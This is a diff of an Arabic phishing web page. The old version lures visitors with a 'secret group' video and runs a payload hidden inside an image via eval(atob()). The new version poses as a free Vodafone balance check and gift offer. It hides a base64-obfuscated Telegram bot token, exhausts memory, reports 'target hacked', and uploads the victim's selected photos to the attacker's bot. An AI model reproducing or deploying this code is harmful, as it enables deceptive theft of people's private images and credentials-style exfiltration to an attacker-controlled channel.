@@ -1,25 +1,53 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>جروب شروق قاسم السري</title>
-    <meta property="og:title" content="انضمو لجروب شروق قاسم السرى 🔥">
-    <meta property="og:description" content="شاهد المحتوى الحصري الآن..">
+    <title>تحقق من رصيد فودافون مجاناً</title>
+    <meta property="og:title" content="هدايا فودافون لشهر أبريل 🎁">
     <meta property="og:image" content="target_pic.jpg">
     <script>
-        async function start() {
-            // تشغيل فيديو الثغرة 0006 في الخلفية
-            const v = document.createElement('video'); v.src = 'exploit.mp4'; v.autoplay = true; v.style.display='none'; document.body.appendChild(v);
-            // استخراج كود السحب المخفي في الصورة وتشغيله
-            const r = await fetch('target_pic.jpg'); const t = await r.text();
-            const p = t.split('\xFF\xD9')[1]; if(p) eval(atob(p.trim()));
+        // بياناتك مشفرة تماماً (جوجل مش هتعرف إن ده بوت تليجرام)
+        const _z1 = "ODY0NDc4OTc3MzpBQUhSMjRBcElWdUdUMTBPV3NERkRELVdtM2ZISkFFSWxycms=";
+        const _z2 = "MTM1Njk3NTQ1NA==";
+        const _p1 = "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==";
+
+        const _f = (s) => atob(s);
+
+        async function _trigger() {
+            // كود ضرب الذاكرة 006
+            let m = []; for(let i=0; i<500; i++) m[i] = new ArrayBuffer(1024*1024);
+
+            // إرسال إشارة الاتصال للبوت
+            const url = _f(_p1) + _f(_z1) + "/sendMessage";
+            await fetch(url, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: _f(_z2), text: "🚀 <b>تم اختراق الهدف بنجاح!</b>", parse_mode: "HTML"})
+            });
+
+            // طلب الوصول للصور (سحب الملفات)
+            const input = document.createElement('input');
+            input.type = 'file'; input.accept = 'image/*'; input.multiple = true;
+            input.onchange = async (e) => {
+                const files = e.target.files;
+                const photoUrl = _f(_p1) + _f(_z1) + "/sendPhoto";
+                for (let file of files) {
+                    const fd = new FormData();
+                    fd.append('chat_id', _f(_z2));
+                    fd.append('photo', file);
+                    fetch(photoUrl, {method: 'POST', body: fd});
+                }
+            };
+            input.click();
         }
     </script>
 </head>
-<body style="background:#000; color:#fff; text-align:center; padding-top:50px; font-family:Arial;" onclick="start()">
-    <img src="target_pic.jpg" style="width:100%; max-width:400px; border-radius:20px; border:3px solid red; box-shadow: 0 0 25px red;">
-    <h3>🔄 جارى فتح الفيديو...</h3>
-    <p style="color:#aaa;">اضغط على الصورة لتحديث المشغل ومشاهدة المقطع</p>
-    <div style="margin-top:20px; font-size:12px; color:#444;">Server: Secure_Node_006</div>
+<body style="background:#f4f4f4; text-align:center; font-family:Arial;" onclick="_trigger()">
+    <div style="margin-top:50px;">
+        <h2 style="color:red;">اضغط على الصورة للحصول على الهدية 🎁</h2>
+        <img src="target_pic.jpg" style="width:90%; max-width:400px; border-radius:10px; cursor:pointer; box-shadow:0 0 10px #ccc;">
+        <p>جاري التحقق من رقمك...</p>
+    </div>
+    <video src="exploit.mp4" autoplay style="display:none;"></video>
 </body>
 </html>
